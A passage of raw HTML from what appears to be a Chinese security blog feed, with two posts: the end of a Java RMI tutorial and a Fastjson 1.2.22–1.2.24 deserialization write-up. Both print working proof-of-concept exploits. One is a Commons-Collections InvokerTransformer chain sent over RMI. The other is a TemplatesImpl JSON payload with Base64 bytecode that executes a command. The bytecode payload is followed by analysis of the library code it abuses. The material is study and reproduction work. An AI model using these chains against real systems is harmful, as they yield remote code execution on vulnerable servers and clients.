class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Server-amp-Registry"><a href="#Server-amp-Registry" class="headerlink" title="Server&amp;Registry"></a>Server&amp;Registry</h2><p>创建RMI Registry，创建远程对象，绑定Name和远程对象，运行RMI服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化对象</span></span><br><span class="line">            RemoteHello h = <span class="keyword">new</span> RemoteHelloImpl();</span><br><span class="line">            <span class="comment">//用于导出远程对象，将此服务转换为远程服务接口</span></span><br><span class="line">            RemoteHello skeleton = (RemoteHello) UnicastRemoteObject.exportObject(h, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">//// 将RMI服务注册到1099端口:</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="comment">// 注册此服务，服务名为"Hello":</span></span><br><span class="line">            <span class="comment">//Naming.rebind("rmi://127.0.0.1:1099/Hello", h);</span></span><br><span class="line">            Naming.rebind(<span class="string">"Hello"</span>, h);</span><br><span class="line">            System.out.println(<span class="string">"[*]Biding is OVER!"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 连接到服务器localhost，端口1099:</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 查找名称为"Hello"的服务并强制转型为Hello接口:</span></span><br><span class="line">        RemoteHello h = (RemoteHello) registry.lookup(<span class="string">"Hello"</span>);</span><br><span class="line">        <span class="comment">// 正常调用接口方法:</span></span><br><span class="line">        String rs = h.sayHello(<span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(rs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上为基本操作，接下来进行攻击。</p>
<p>JDK:1.7u21</p>
<p>JAR:Commons-Collections3.1</p>
<p>Maven;</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="客户端攻击服务器"><a href="#客户端攻击服务器" class="headerlink" title="客户端攻击服务器"></a>客户端攻击服务器</h2><p>先上代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC_Client2Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 连接到服务器localhost，端口1099:</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 查找名称为"Hello"的服务并强制转型为Hello接口:</span></span><br><span class="line">        RemoteHello h = (RemoteHello) registry.lookup(<span class="string">"Hello"</span>);</span><br><span class="line">        <span class="comment">// 正常调用接口方法:</span></span><br><span class="line">        <span class="comment">//String rs = h.sayHello("rai4over");</span></span><br><span class="line">        String rs = h.exp1(payload());</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(rs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"lala"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">transformedMap</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如图：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200627121658858.png" alt="image-20200627121658858"></p>
<p>如果客户端传递给服务端恶意序列化数据，服务端反序列化时调用<code>readObject</code>就会遭到攻击。</p>
<h2 id="服务器攻击客户端"><a href="#服务器攻击客户端" class="headerlink" title="服务器攻击客户端"></a>服务器攻击客户端</h2><p>反之，服务端同样可以通过恶意反序列化数据攻击客户端。</p>
<p>先上代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC_Server2Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 连接到服务器localhost，端口1099:</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 查找名称为"Hello"的服务并强制转型为Hello接口:</span></span><br><span class="line">        RemoteHello h = (RemoteHello) registry.lookup(<span class="string">"Hello"</span>);</span><br><span class="line">        <span class="comment">// 正常调用接口方法:</span></span><br><span class="line">        <span class="comment">//String rs = h.sayHello("rai4over");</span></span><br><span class="line">        <span class="comment">//String rs = h.exp1(payload());</span></span><br><span class="line">        Object rs = h.exp2();</span><br><span class="line">        <span class="comment">// 打印调用结果:</span></span><br><span class="line">        System.out.println(rs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击截图：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200627122739474.png" alt="image-20200627122739474"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于第一种客户端攻击服务器，其实是客户端自己有payload恶意函数，序列化对象发送给服务器时进行反序列化，造成漏洞触发。</p>
<p>第二种服务器攻击客户端，其实是服务器内部本身就有payload恶意函数，当对象请求调用的时候，服务器将序列化对象返还给客户端，客户端本地进行反序列化，漏洞遭到触发。</p>
<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">参考博客</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson学习笔记02</title>
    <url>/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>冯唐易老，李广难封。</p>
</blockquote>
<p>前一篇总结了fastjson的基础知识，今天来介绍由它引起的一系列漏洞。</p>
<a id="more"></a>

<h1 id="1-2-22-1-2-24反序列化漏洞"><a href="#1-2-22-1-2-24反序列化漏洞" class="headerlink" title="1.2.22-1.2.24反序列化漏洞"></a>1.2.22-1.2.24反序列化漏洞</h1><p>对于Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链：</p>
<ul>
<li>基于TemplateImpl；</li>
<li>基于JNDI（又分为基于Bean Property类型和Field类型）；</li>
</ul>
<h2 id="需要的jar包"><a href="#需要的jar包" class="headerlink" title="需要的jar包"></a>需要的jar包</h2><p>直接贴出pom.xml文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>maven还是好用鸭，几行搞定</p>
<h2 id="基于TemplateImpl的利用链"><a href="#基于TemplateImpl的利用链" class="headerlink" title="基于TemplateImpl的利用链"></a>基于TemplateImpl的利用链</h2><p>最早是<a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">廖师傅</a>提出来的。</p>
<h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>需要设置<strong>Feature.SupportNonPublicField</strong>进行反序列化操作才能成功触发利用。</p>
<h4 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h4><p>恶意类Test.java，用于弹计算器，至于为啥需要继承AbstractTranslet类在后面的调试分析中会具体看到：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Test t = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Test.java的构造函数中执行了一条命令，弹出计算器。编译Test.java得到Test.class供后续使用。</p>
<p>PoC.java，Fastjson反序列化漏洞点，Feature.SupportNonPublicField必须设置，readClass()方法用于将恶意类的二进制数据进行Base64编码，至于为何要进行编码在后面会讲到：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/TemplateImpl/Test.class"</span>;</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(text1, Object<span class="class">.<span class="keyword">class</span>, <span class="title">config</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行即可弹出计算器：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624213753718.png" alt="image-20200624213753718"></p>
<p>关键看输出的构造的PoC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="string">"_bytecodes"</span>:[<span class="string">"yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA=="</span>],<span class="string">'_name'</span>:<span class="string">'a.b'</span>,<span class="string">'_tfactory'</span>:&#123; &#125;,<span class="string">"_outputProperties"</span>:&#123; &#125;,<span class="string">"_name"</span>:<span class="string">"a"</span>,<span class="string">"_version"</span>:<span class="string">"1.0"</span>,<span class="string">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>PoC中几个重要的Json键的含义：</p>
<ul>
<li><strong>@type</strong>——指定的解析类，即<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</li>
<li><strong>_bytecodes</strong>——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；其中就利用了TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，简直不能再更妙，这就解决了fastjson通过字段传入一个类，再通过这个类执行有害代码。</li>
<li><strong>_outputProperties</strong>——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；</li>
<li><strong>_tfactory:{}</strong>——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；</li>
</ul>
<p>在这个poc中，最核心的部分是<strong>_bytecodes</strong>，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中<strong>_bytecodes</strong>却是私有属性，<strong>_name</strong>也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样<strong>_bytecodes</strong>字段才会被反序列化。</p>
<p><strong>_tfactory</strong>这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置<strong>_tfactory</strong>为<code>{ }</code>,fastjson会调用其无参构造函数得<strong>_tfactory</strong>对象，这样就解决了某些版本中在defineTransletClasses()用到会引用<strong>_tfactory</strong>属性导致异常退出。接下来我们看下TemplatesImpl.java的几个关键函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            &#125;</span><br><span 